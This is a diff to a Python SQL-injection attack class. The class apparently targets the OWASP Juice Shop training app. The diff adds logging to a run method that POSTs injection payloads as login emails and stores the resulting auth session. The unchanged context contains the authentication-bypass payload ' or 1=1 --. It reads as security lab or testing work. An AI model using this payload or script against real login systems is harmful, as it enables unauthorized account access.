@@ -15,6 +15,11 @@ class SQL_injector(a.attack_inter):
         return json_data
 
     def run(self, userInput = '\' or 1=1 --', username = 'admin'):
+        a.logging.basicConfig(filename='./test_logging_info.log', encoding='utf-8',
+                            level=a.logging.INFO, format='%(asctime)s %(message)s')
+        logger = a.logging.getLogger("SQL_injection")
+        a.logging.info(logger)
+        a.logging.info('Started')
         # [-4:]
         if userInput[-4:] == '.txt':
             f = open(userInput, "r")
@@ -27,6 +32,7 @@ class SQL_injector(a.attack_inter):
                     print("Valid script: ", json_data['email'])
                     a.set_auth(username,response)
                     break
+            a.logging.info('Finished')
         else:
             json_data = self.generator(userInput)
             response = self.juice_session.post(self.url, json=json_data)
@@ -35,4 +41,6 @@ class SQL_injector(a.attack_inter):
                 print(response.text)
                 print("Valid script: ", json_data['email'])
                 a.set_auth(username,response)
+
+            a.logging.info('Finished')
             return response.status_code
